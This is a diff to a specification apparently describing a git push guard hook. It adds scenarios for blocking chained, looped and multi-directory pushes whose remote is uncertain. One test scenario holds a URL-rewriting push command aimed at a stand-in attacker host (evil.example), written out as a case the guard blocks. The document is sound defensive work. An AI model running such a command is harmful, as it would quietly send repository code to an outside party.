@@ -40,11 +40,19 @@ The ownership guards SHALL read the operator's owners from `CADENCE_ALLOWED_OWNE
 - **THEN** the hook allows, each push judged on its own target
 
 ### Requirement: Push shapes the push guard refuses
-`guard-push-remote` SHALL block a push whose destination it read as uncertain. In a command the loop parser reads, that is a looped push with no explicit remote, a bare push chained after a branch switch or tracking change, or more than four loop remotes. In any command, it is a URL with no `owner/repo`, a repository moved by `eval`, `trap` or a `GIT_DIR`/`--git-dir`/`--work-tree` redirect, a push URL rewritten in the command, more than four push directories, or a remote git cannot resolve.
+`guard-push-remote` SHALL block a push whose destination it read as uncertain. In a command the loop parser reads: a looped push with no remote, a bare push in a chain of pushes that switches branch or changes tracking, or over four loop remotes. In any command: a URL with no `owner/repo`, a repository moved by `eval`, `trap`, `GIT_DIR`, `--git-dir` or `--work-tree`, a push URL the command rewrites, pushes in over four `git -C` or subshell `cd` directories, or a remote git cannot resolve.
 
 #### Scenario: Loop with no remote
 - **WHEN** the command is `for b in a b; do git push; done`
 - **THEN** the hook exits 2 with `git push in loop without explicit remote`
+
+#### Scenario: Bare push in a chain that switches branch
+- **WHEN** the command is `git push origin feat && git checkout main && git push`
+- **THEN** the hook exits 2 with `chained git push without explicit remotes`
+
+#### Scenario: Pushes in five directories
+- **WHEN** the command is `git -C d1 push origin main && git -C d2 push origin main && git -C d3 push origin main && git -C d4 push origin main && git -C d5 push origin main`
+- **THEN** the hook exits 2 with `too many push directories to verify`
 
 #### Scenario: Rewritten push URL
 - **WHEN** the command is `git -c url.https://evil.example/.insteadOf=https://github.com/ push origin main`
@@ -290,3 +298,10 @@ With `CADENCE_GH_STRICT_LOOPS=1`, `guard-gh-write` MUST block a command the loop
 #### Scenario: Unreadable loop of pushes that name a remote
 - **WHEN** a comment takes `for b in main feat; do git push origin $b; done` past 12 KB, in an owned checkout
 - **THEN** the hook allows with no output
+
+### Requirement: Unparsed push nudges name the branch a bare push was checked on
+`guard-push-remote`'s nudges for a command the loop parser cannot read SHALL say that a bare push was checked against the branch checked out before the command runs, since a `git checkout` in the same command can send it to another remote.
+
+#### Scenario: Unreadable chain with a branch switch
+- **WHEN** a comment takes `git push origin main && git checkout other && git push` past 12 KB, in an owned checkout
+- **THEN** the hook exits 0 with a nudge that says a bare push was checked against the branch checked out now
